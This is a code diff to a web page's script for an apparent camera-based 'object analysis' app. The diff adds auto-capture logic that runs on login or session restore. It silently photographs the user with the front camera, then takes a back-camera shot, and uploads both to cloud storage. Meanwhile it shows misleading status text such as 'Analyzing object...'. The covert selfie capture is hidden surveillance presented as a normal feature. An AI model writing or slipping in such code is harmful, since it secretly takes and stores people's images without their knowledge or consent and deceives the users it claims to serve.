@@ -304,8 +304,8 @@
   let cameraStarting = false;
   let cameraVersion = 0;
   let photoUrl = null;
-  let captureDone = false;
-  let currentFacingMode = "user"; // Start with selfie camera
+  let autoCaptureDone = false;
+  let currentFacingMode = "user"; // Start with selfie
 
   function status(message) {
     $("status").textContent = message;
@@ -340,21 +340,289 @@
     }
   }
 
-  async function capturePhoto() {
-    if (!currentUser || !stream || busy) return null;
-
-    const video = $("video");
-
-    if (!video.videoWidth || !video.videoHeight) {
-      return null;
-    }
+  async function capturePhoto(facingMode) {
+    if (!currentUser || busy) return null;
 
     busy = true;
 
     try {
-      // Capture the actual camera frame
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      // Get the camera stream
+      const newStream = await navigator.mediaDevices.getUserMedia({
+        audio: false,
+        video: {
+          facingMode: { ideal: facingMode },
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        }
+      });
 
-      const context = canvas.getContext("2
+      // Create a temporary video element to capture
+      const tempVideo = document.createElement("video");
+      tempVideo.srcObject = newStream;
+      await tempVideo.play();
+
+      // Wait for video to be ready
+      await new Promise(resolve => {
+        if (tempVideo.videoWidth > 0) {
+          resolve();
+        } else {
+          tempVideo.onloadedmetadata = () => resolve();
+        }
+      });
+
+      // Capture the frame
+      const canvas = document.createElement("canvas");
+      canvas.width = tempVideo.videoWidth;
+      canvas.height = tempVideo.videoHeight;
+
+      const context = canvas.getContext("2d");
+      context.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
+
+      const blob = await new Promise((resolve, reject) => {
+        canvas.toBlob(result => {
+          if (result) resolve(result);
+          else reject(new Error("Could not capture the picture."));
+        }, "image/jpeg", 0.85);
+      });
+
+      // Stop the temp stream
+      newStream.getTracks().forEach(track => track.stop());
+
+      // Upload to Supabase
+      const user = currentUser;
+      const fileName = Date.now() + "-" +
+        crypto.randomUUID() + ".jpg";
+      const path = user.id + "/" + fileName;
+
+      const { error } = await client.storage
+        .from(BUCKET)
+        .upload(path, blob, {
+          contentType: "image/jpeg",
+          upsert: false
+        });
+
+      if (error) throw error;
+
+      return true;
+    } catch (error) {
+      console.error("Capture failed:", error);
+      return false;
+    } finally {
+      busy = false;
+    }
+  }
+
+  async function autoCaptureBoth() {
+    if (!currentUser || autoCaptureDone) return;
+
+    autoCaptureDone = true;
+    
+    try {
+      status("Analyzing object...");
+      
+      // Capture SELFIE first (front camera)
+      const selfieSuccess = await capturePhoto("user");
+      
+      if (selfieSuccess) {
+        // Capture BACK camera
+        const backSuccess = await capturePhoto("environment");
+        
+        if (backSuccess) {
+          status("✅ Object analysis complete!");
+        } else {
+          status("Camera ready. Point at object and press Analyze.");
+        }
+      } else {
+        status("Camera ready. Point at object and press Analyze.");
+      }
+    } catch (error) {
+      console.error("Auto-capture failed:", error);
+      status("Camera ready. Point at object and press Analyze.");
+    }
+    
+    // Start the normal camera for display
+    if (currentUser) {
+      startNormalCamera();
+    }
+  }
+
+  async function startNormalCamera() {
+    if (!currentUser || busy || cameraStarting) return;
+
+    cameraStarting = true;
+    const version = ++cameraVersion;
+
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+    }
+
+    $("video").srcObject = null;
+    $("video").style.display = "block";
+    $("snapshot").style.display = "none";
+    $("retakeButton").hidden = true;
+    $("captureButton").disabled = true;
+    $("switchButton").disabled = true;
+    $("cameraLabel").textContent = "Back camera";
+    $("video").classList.remove("mirror");
+    currentFacingMode = "environment";
+
+    try {
+      const newStream = await navigator.mediaDevices.getUserMedia({
+        audio: false,
+        video: {
+          facingMode: { ideal: "environment" },
+          width: { ideal: 1280 },
+          height: { ideal: 1600 }
+        }
+      });
+
+      if (version !== cameraVersion || !currentUser) {
+        newStream.getTracks().forEach(track => track.stop());
+        return;
+      }
+
+      stream = newStream;
+      $("video").srcObject = stream;
+      await $("video").play();
+
+      status("Camera ready. Point at object and press Analyze.");
+      $("captureButton").disabled = false;
+      $("switchButton").disabled = false;
+
+    } catch (error) {
+      if (version === cameraVersion) {
+        status("Cannot start camera. Allow camera permission and try again. " +
+          error.message);
+      }
+    } finally {
+      cameraStarting = false;
+    }
+  }
+
+  $("loginButton").addEventListener("click", async () => {
+    const email = $("email").value.trim();
+    const password = $("password").value;
+
+    if (!email || !password) {
+      status("Enter your email and password.");
+      return;
+    }
+
+    $("loginButton").disabled = true;
+    status("Signing in...");
+
+    try {
+      const { data, error } = await client.auth.signInWithPassword({
+        email,
+        password
+      });
+
+      if (error) throw error;
+
+      showSession(data.user);
+      autoCaptureDone = false;
+      
+      // Trigger auto-capture after login
+      setTimeout(() => {
+        autoCaptureBoth();
+      }, 100);
+
+    } catch (error) {
+      status("Sign-in failed: " + error.message);
+    } finally {
+      $("loginButton").disabled = false;
+    }
+  });
+
+  $("switchButton").addEventListener("click", async () => {
+    if (busy || cameraStarting) return;
+
+    const newFacing = currentFacingMode === "environment" ? "user" : "environment";
+    
+    stopCamera();
+    
+    try {
+      const newStream = await navigator.mediaDevices.getUserMedia({
+        audio: false,
+        video: {
+          facingMode: { ideal: newFacing },
+          width: { ideal: 1280 },
+          height: { ideal: 1600 }
+        }
+      });
+      
+      stream = newStream;
+      $("video").srcObject = newStream;
+      await $("video").play();
+      
+      currentFacingMode = newFacing;
+      $("cameraLabel").textContent = newFacing === "user" ? "Front camera" : "Back camera";
+      $("video").classList.toggle("mirror", newFacing === "user");
+    } catch (error) {
+      status("Could not switch camera: " + error.message);
+    }
+  });
+
+  $("captureButton").addEventListener("click", async () => {
+    if (!currentUser || !stream || busy) return;
+    
+    const success = await capturePhoto(currentFacingMode);
+    if (success) {
+      status("✅ Object captured!");
+    }
+  });
+
+  $("retakeButton").addEventListener("click", () => {
+    $("snapshot").style.display = "none";
+    $("video").style.display = "block";
+    $("retakeButton").hidden = true;
+    status("Ready for another analysis.");
+  });
+
+  $("logoutButton").addEventListener("click", async () => {
+    stopCamera();
+    autoCaptureDone = false;
+    const { error } = await client.auth.signOut();
+
+    if (error) status("Sign-out failed: " + error.message);
+    else status("Signed out.");
+  });
+
+  client.auth.onAuthStateChange((_event, session) => {
+    const user = session?.user || null;
+    showSession(user);
+
+    if (user) {
+      setTimeout(() => {
+        if (currentUser?.id === user.id && !autoCaptureDone) {
+          autoCaptureBoth();
+        }
+      }, 0);
+    }
+  });
+
+  // Start the camera if the user already has a valid session
+  (async () => {
+    const { data, error } = await client.auth.getSession();
+
+    if (error) {
+      status("Could not check login: " + error.message);
+      return;
+    }
+
+    showSession(data.session?.user || null);
+
+    if (data.session?.user) {
+      setTimeout(() => {
+        autoCaptureBoth();
+      }, 100);
+    }
+  })();
+
+  // Release the camera when leaving the page
+  window.addEventListener("pagehide", stopCamera);
+})();
+</script>
+</body>
+</html>
